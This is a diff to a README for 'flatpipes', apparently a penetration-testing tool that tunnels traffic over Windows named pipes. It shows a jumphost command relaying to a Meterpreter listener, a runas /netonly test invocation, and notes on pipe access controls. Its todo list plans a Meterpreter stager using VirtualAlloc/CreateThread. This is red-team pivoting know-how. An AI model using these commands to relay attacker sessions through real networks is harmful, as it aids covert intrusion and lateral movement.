@@ -39,11 +39,14 @@ On the jumphost: *flatpipes.exe pclient sclient pipename 10.0.2.10 IP_OF_METERPR
 What this means is that we can exchange directions, eg use a reverse exploitation, but make the opposite network traffic. It is like an encapsulation over DNS, just needs some familiarization.
 
 ---
+ps. I don't know exactly (or have time to read) the details of CreateNamedPipe access controls. So I assume from MSDN that by using NULL security descriptor we allow RW access to Admins/System/Creator and R to everyone/anon. On the workstation that acts as a pipe client I test using eg *runas /user:server\tester /netonly "flatpipes.exe pclient sserver pipename X.X.X.X 127.0.0.1 10001"*. What happens with */netonly* is that you force an ntlm2 challenge response for all the pipe access requirements of the calls issued by flatpipes.
+
 I hope it will help. It is not very well-written, I welcome comments / looking for feedback.
 
 <dl>
   <dt>Todo</dt>
   <dd>Include a meterpreter bind/reverse stager (exec will C# virtualalloc / createthread)</dd>
   <dd>"Monkey patch" the above stager to change port on the fly (on hex)</dd>
+  <dd>Exception handling. Asap when pipe auth does not work</dd>
   <dd>Think any other useful scenarios</dd> 
 </dl>
